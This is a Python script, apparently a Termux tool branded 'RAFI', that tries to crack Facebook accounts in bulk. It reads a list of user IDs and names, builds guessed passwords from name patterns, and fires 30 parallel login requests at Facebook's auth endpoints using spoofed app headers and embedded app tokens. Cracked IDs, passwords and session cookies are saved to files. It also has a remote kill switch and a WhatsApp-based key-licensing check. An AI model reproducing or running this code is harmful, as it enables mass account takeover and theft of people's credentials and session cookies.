#-------------------< IMPORT >--------------------#
#--------------------< RAFI>--------------------#
import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3,platform,math,smtplib,os,base64,zlib,pip,urllib
from os import path
from urllib.request import urlopen
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print('<[=]> INSTALLING MISSING MODULES...');os.system('pip install requests futures==2 > /dev/null')
except:pass
#--------------------< LOOP >--------------------#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];user=[];plist=[]
#--------------------< SYS >--------------------#
sys.stdout.write('\x1b]2; RAFI\x07')
#--------------------< COLOUR >--------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";P="\x1b[38;5;205m"
#--------------------< STYLE >--------------------#
xd=f"{R}[{W}+{R}]{G}";xd1=f"{R}[{W}1{R}]{G}";xd2=f"{R}[{W}2{R}]{G}";xd3=f"{R}<{W}3{R}>{G}";xd4=f"{R}<{W}4{R}>{G}";xd5=f"{R}<{W}5{R}>{G}";xd6=f"{R}<{W}6{R}>{G}";xd0=f"{R}[{W}0{R}]{G}";xdx=f"{R}<{W}?{R}>{G}";xdxx=f"{R}:{G}"
#--------------------< CLEAR >--------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
 
#_____________[ tool version]_____________#
try:
	version = requests.get("https://raw.githubusercontent.com/styletee176-ai/RAFI-143/refs/heads/main/Version.txt").text
except:
	print('No Internet Connection');exit()
version = version.strip()
session = requests.Session()
 
 
#_______________| color list 3 |_______________#
 
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#--------------------< LOGO >--------------------#
logo=f"""\x1b[1;97m
\x1b[1;97m███    ██  ██████    ██████  ██ ███████ ██   ██ 
\x1b[38;5;46m████   ██ ██    ██   ██   ██ ██ ██      ██  ██  
\x1b[38;5;46m██ ██  ██ ██    ██   ██████  ██ ███████ █████   
\x1b[38;5;46m██  ██ ██ ██    ██   ██   ██ ██      ██ ██  ██  
\x1b[1;97m██   ████  ██████    ██   ██ ██ ███████ ██   ██
{M}════════════════════════════════════════════════
{R}[{G1}√\x1b{R}]{G1} 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 {W}:{G1} RAFI
{R}[{G1}√\x1b{R}]{G1} 𝐓𝐎𝐎𝐋𝐒 𝐅𝐎𝐑 {W}: \x1b[38;5;196m\033[47m𝐅𝐈𝐋𝐄\x1b[0m{Y}\x1b[38;5;196m\033[47m𝐂𝐋𝐎𝐍𝐄 \x1b[0m
{R}[{G1}√\x1b{R}]{G1} 𝐕𝐄𝐑𝐒𝐈𝐎𝐍   {W}:{G1} 𝐕{R}/{G1}{version}
{R}[{G1}√\x1b{R}]{G1} 𝐒𝐓𝐀𝐓𝐔𝐒    {W}:{Y} 𝐏𝐑𝐄𝐌𝐈𝐔𝐌
{M}════════════════════════════════════════════════"""
#{W}──────────────────────────────────────────────────"""
#--------------------< MAIN MENU >--------------------#
def RAFI():
	clear();print(f"{R}[{G1}1{R}]{G1} 𝐅𝐈𝐋𝐄 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 ");print(f"{R}[{G1}0{R}]{G1} 𝐄𝐗𝐈𝐓 𝐓𝐎𝐎𝐋𝐒");linex();sadiya=input(f"{R}[{G}?{R}] {G}CHOICE {W}: {G}")
	if sadiya in ['1']:___file___()	
	elif sadiya in ['0']:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN");time.sleep(1);RAFI()
#--------------------< FILE MENU >--------------------#
def ___file___():
	clear();print(f'{R}[{G}√\x1b{R}] {G}EXAMPLE {W}: {G}/sdcard/RAFI.txt');linex();file=input(f"{R}[{G}?{R}] {G}FILE NAME {W}: {G}")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN");time.sleep(1);___file___()
	clear();print(f'{R}[{G1}1{R}]{G1} METHOD {R}[{G}M1{R}]');print(f'{R}[{G1}2{R}]{G1} METHOD {R}[{G}M2{R}]');linex();methd=input(f"{R}[{G}?{R}] {G}CHOICE {W}: {G}")
	clear();print(f'{R}[{G}√\x1b{R}]{G} NOTE {W}: {G}BD WORKING ONLY AUTO PASSWORD   ');linex();print(f'{R}[{G1}1{R}]{G1} AUTO PASSWORD CLONE');print(f'{R}[{G1}2{R}]{G1} MANUAL PASSWORD CLONE');linex();ppp=input(f"{R}[{G}?{R}] {G}CHOICE {W}: {G}")
	if ppp in ['1']:
		plist.append('firstlast')
		plist.append('first last')
		plist.append('first12')
		plist.append('first123')
		plist.append('first1234')
		plist.append('first12345')
		plist.append('first@')
		plist.append('first@@')
		plist.append('first@@@')
		plist.append('first@@@@')
		plist.append('first@#')
		plist.append('first@@##')
		plist.append('first@123')
		plist.append('first##')
		plist.append('first1122')
		plist.append('first111')
		plist.append('@first@')
		plist.append('@@first@@')
		plist.append('First123')
		plist.append('last123')
		plist.append('first###')
		plist.append('@@@###')
		plist.append('Bangla')
		plist.append('Bangladesh')
		plist.append('free fire')
	else:
		try:
			clear();print(f'{R}[{G}√\x1b{R}] {G}EXAMPLE {W}:{G} PASSWORD LIMIT {R}[{G}10-25{R}]');linex()
			ps_limit = int(input(f'{R}[{G}?{R}] {G}PASSWORD LIMIT {W}: {G}'))
		except:
			ps_limit = 5
		clear();print(f'{R}[{G}√\x1b{R}] {G}EXAMPLE {W}: {G} first12 {R}|{G} first123 {R}|{G} firstlast ');linex()
		for i in range(ps_limit):
			plist.append(input(f'{R}[{G}?{R}] {G}PASSWORD NO{R} [{G}{i+1}{R}] {W}: {G}'))
	clear();print(f'{R}[{G}√\x1b{R}] {G}CP UID SHOW {W}:{G} {R}[{G}y{R}][{G}n{R}]');linex();cpx=input(f"{R}[{G}?{R}] {G}CHOICE {W}: {G}")
	if cpx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	with tred(max_workers=30) as __RAFI__:
		clear();total_ids = str(len(fo))
		print(f'{R}[{G}√\x1b{R}] {G}TOTAL ID {W}: {G}{total_ids}{R} ');print(f"{R}[{G}√\x1b{R}] {G}IF NO RESULT {R}{G}ON{R}|{Y}OFF{R}{G} AIRPLANE MODE");linex()       
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd in ['1']:
				__RAFI__.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:
				__RAFI__.submit(___M2___,ids,names,passlist)
			else:
				__RAFI__.submit(___M1___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{R}[{G}√\x1b{R}]{G} THE PROCESS HAS COMPLETED');print(f'{R}[{G}√\x1b{R}]{G} TOTAL OK{R}|{G}CP {W}: {G}'+str(len(oks))+'/'+str(len(cps)));linex();exit()
#--------------------< FILE METHOD M1 >--------------------#
def ___M1___(ids,names,passlist):
		try:
				global loop,oks,cps
				sys.stdout.write(f'\r\r{G1}[RAFI-M1]{W}-{R}[{T}%s{R}]{W}-{R}[{G}%s{R}]{W}-{R}[{P}%s{R}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
				fn = names.split(' ')[0]
				try:
						ln = names.split(' ')[1]
				except:
						ln = fn
				for pw in passlist:
						pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
						with requests.Session() as session:
							M1 = "[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295907003;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
							data = {"adid": str(uuid.uuid4()),
							"format": "json","device_id": str(uuid.uuid4()),
							"cpl": "true","family_device_id":str(uuid.uuid4()),
							"credentials_type": "device_based_login_password",
							"error_detail_type": "button_with_disabled",
							"source": "device_based_login",
							"email": ids,"password": pas,
							"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
							"generate_session_cookies": "1",
							"meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),
							"currently_logged_in_userid": "0","locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
							"client_country_code": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
							"method": "auth.login","fb_api_req_friendly_name": "authenticate",
							"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
							"api_key": "882a8490361da98702bf97a021ddc14d"}
							headers = {'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{M1}',
							"Accept-Encoding": "gzip, deflate",
							"Accept": "*/*","Connection": "keep-alive",
							"Content-Type": "application/x-www-form-urlencoded",
							"Host": "graph.facebook.com",
							"X-FB-Net-HNI": str(random.randint(3000000,4000000)),
							"X-FB-SIM-HNI": str(random.randint(20000,40000)),
							"X-FB-Connection-Type": "MOBILE.LTE",
							"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
							"x-fb-device-group": str(random.randint(3000000,4000000)),
							"X-FB-Friendly-Name": "ViewerReactionsMutation",
							"X-FB-Request-Analytics-Tags": "graphservice",
							"X-FB-HTTP-Engine": "Liger",
							"X-FB-Client-IP": "True","X-FB-Server-Cluster": "True",
							"x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
						url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
						twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
						po = requests.post(url,data=data,headers=headers).json()
						if 'session_key' in po:
										cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}RAFI-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
										open('/sdcard/RAFI-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
										oks.append(ids)
										break
						elif 'www.facebook.com' in po['error']['message']:
										if 'y' in pcp:
												print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}RAFI-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
												open('/sdcard/RAFI-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
												cps.append(ids)
												break
						else:continue
				loop+=1
		except Exception as e:
				pass
#--------------------< FILE METHOD M2 >--------------------#
def ___M2___(ids,names,passlist):
		try:
				global loop,oks,cps
				sys.stdout.write(f'\r\r{G1}RAFI{R}{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
				fn = names.split(' ')[0]
				try:
						ln = names.split(' ')[1]
				except:
						ln = fn
				for pw in passlist:
						pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
						accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
						random_seed = random.Random()
						adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
						M2 = "[FBAN/FB4A;FBAV/315.0.0.47.113;FBBV/285966859;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/ Cell C;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
						data = {"adid": adid,"format": "json",
						"device_id": str(uuid.uuid4()),
						"email": ids,"password": pas,
						"generate_analytics_claims": "1",
						"credentials_type": "password",
						"source": "login","error_detail_type": "button_with_disabled",
						"enroll_misauth": "false",
						"generate_session_cookies": "1",
						"generate_machine_id": "1",
						"fb_api_req_friendly_name": "authenticate",}
						headers={"Accept-Encoding": "gzip, deflate",
						"Accept": "*/*","Connection": "keep-alive",
						"User-Agent": '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{M2}',
						"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
						"X-FB-Friendly-Name": "authenticate",
						"X-FB-Connection-Type": "unknown",
						"Content-Type": "application/x-www-form-urlencoded",
						"X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
						url = 'https://b-graph.facebook.com/auth/login'
						twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
						po = requests.post(url,data=data,headers=headers).json()
						if 'session_key' in po:
										cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}RAFI-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
										open('/sdcard/RAFI-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
										oks.append(ids)
										break
						elif 'www.facebook.com' in po['error']['message']:
										if 'y' in pcp:
												print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}RAFI-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
												open('/sdcard/RAFI-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
												cps.append(ids)
												break
						else:continue
				loop+=1
		except Exception as e:
				pass
 
 
import os
import time
import requests
import sys
import random
colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m']
reset_color = '\033[0m'
 
def typewriter(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.04)
    sys.stdout.write('\n')  #
try:
    os.system('clear')
    srv = requests.get('https://raw.githubusercontent.com/styletee176-ai/RAFI-143/refs/heads/main/Server.txt').text
    if "update" in srv:
        os.system('clear')
        count = 0
        for j in range(3000):
            if count % 10 == 0:
                os.system('xdg-open https://chat.whatsapp.com/H7JP3brz18vLCEUCKNSDlF?mode=ac_t')
            color = random.choice(colors)
            typewriter(f'{color}[+] 𝐓𝐨𝐨𝐥 𝐈𝐬 𝐔𝐩𝐝𝐚𝐭𝐢𝐧𝐠 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐓𝐡𝐞 𝐔𝐩𝐝𝐚𝐭𝐞{reset_color}\n')
            time.sleep(3)
            count += 1
        exit()
 
    elif "off" in srv:
        os.system('clear')
        count = 0
        for j in range(3000):
            if count % 10 == 0:
                os.system('xdg-open https://chat.whatsapp.com/H7JP3brz18vLCEUCKNSDlF?mode=ac_t')
            color = random.choice(colors)
            typewriter(f'{color}[✓] 𝐓𝐨𝐨𝐥 𝐈𝐬 𝐂𝐮𝐫𝐫𝐞𝐧𝐭𝐲 𝐎𝐟𝐟{reset_color}\n')
            time.sleep(3)
            count += 1
        exit()
 
except requests.exceptions.ConnectionError:
    print(f"\033[1;91m 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐏𝐫𝐨𝐛𝐥𝐞𝐦, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐀𝐧𝐝 𝐑𝐮𝐧 𝐀𝐠𝐚𝐢𝐧")
    sys.exit()
 
 
#----------------------■ Approve ■----------------------#
import os
import subprocess
import pycurl
from io import BytesIO
import time
import sys
import urllib.parse
from datetime import datetime
import random
 
# ========== Configuration ==========
OWNER_WHATSAPP_NUMBER = "+8801876637528"
GITHUB_KEYS_URL = "https://raw.githubusercontent.com/styletee176-ai/RAFI-143/refs/heads/main/Approve.txt"
 
# Global variables
device_key = None
expiry_date_str = None
remaining_days = None
 
# Dummy variables used in output
colors = ['\033[92m', '\033[94m', '\033[96m', '\033[91m', '\033[93m']
reset_color = '\033[0m'
 
def typewriter(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)
    print()
 
# ========== Generate Device Key ==========
def generate_key():
    try:
        uid = str(os.geteuid())
        build_id = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').strip()
        combined = (uid + build_id + uid).upper().replace(".", "")
        joined = "X".join(combined)
        return joined[15:]
    except Exception:
        sys.exit()
 
# ========== Fetch Approved Keys ==========
def fetch_approved_keys():
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(pycurl.URL, GITHUB_KEYS_URL)
        curl.setopt(pycurl.WRITEDATA, buffer)
        curl.perform()
        curl.close()
        data = buffer.getvalue().decode("utf-8").splitlines()
        return [line.strip() for line in data if line.strip()]
    except Exception:
        sys.exit()
 
# ========== Check if Key Exists ==========
def find_key_entry(key, approved_list):
    for entry in approved_list:
        if "|" in entry:
            raw_key, expiry = entry.split("|")
            k = raw_key.split("+")[-1].strip()
            if key == k:
                return expiry.strip()
    return None
 
# ========== Get Expiry Info ==========
def parse_expiry_info(expiry_str):
    if expiry_str.upper() == "PERMANENT":
        return "PERMANENT", None
    for fmt in ("%Y-%m-%d", "%d-%B-%Y"):
        try:
            exp_date = datetime.strptime(expiry_str, fmt)
            remaining = (exp_date - datetime.now()).days
            return expiry_str, remaining
        except ValueError:
            continue
    return "INVALID DATE", None
 
# ========== Open WhatsApp with Key ==========
def send_key_via_whatsapp(key):
    try:
        message = f"\n\n{key}"
        encoded_message = urllib.parse.quote(message)
        whatsapp_url = f"https://wa.me/{OWNER_WHATSAPP_NUMBER}?text={encoded_message}"
        os.system(f"xdg-open '{whatsapp_url}'")
    except Exception:
        sys.exit()
 
# ========== Approval Function ==========
def approval():
    global device_key, expiry_date_str, remaining_days
    device_key = generate_key()
    approved_keys = fetch_approved_keys()
    os.system("clear")
    print(logo)
 
    expiry_raw = find_key_entry(device_key, approved_keys)
 
    if expiry_raw:
        expiry, remaining = parse_expiry_info(expiry_raw)
        expiry_date_str = expiry
        remaining_days = remaining
 
        if expiry == "PERMANENT" or (remaining is not None and remaining >= 0):
            color = random.choice(colors)
            typewriter(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃{reset_color}")
            time.sleep(2)
            RAFI()
        else:
            color = random.choice(colors)
            print(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐇𝐀𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃 𝐎𝐍: {expiry_date_str}{reset_color}")
            print(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐒𝐄𝐍𝐃 𝐊𝐄𝐘 𝐎𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ✓{reset_color}")
        input(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐂𝐋𝐈𝐂𝐊 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘{reset_color} ")
        send_key_via_whatsapp(device_key)
        sys.exit()
    else:
        color = random.choice(colors)
        print(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 ➢{color} {device_key}{reset_color}")
        print(f'\r\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        typewriter(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐈𝐒 𝐍𝐎𝐓 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ❌{reset_color}")
        print(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐒𝐄𝐍𝐃 𝐊𝐄𝐘 𝐎𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ✓{reset_color}")
        input(f"\033[95;1m[\x1b[38;5;50m√\x1b\033[95;1m] {color}𝐂𝐋𝐈𝐂𝐊 𝐄𝐍𝐓𝐄𝐑 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐊𝐄𝐘{reset_color} ")
        time.sleep(1)
        send_key_via_whatsapp(device_key)
        sys.exit()
#--------------------< END CODE >--------------------#
approval()
RAFI()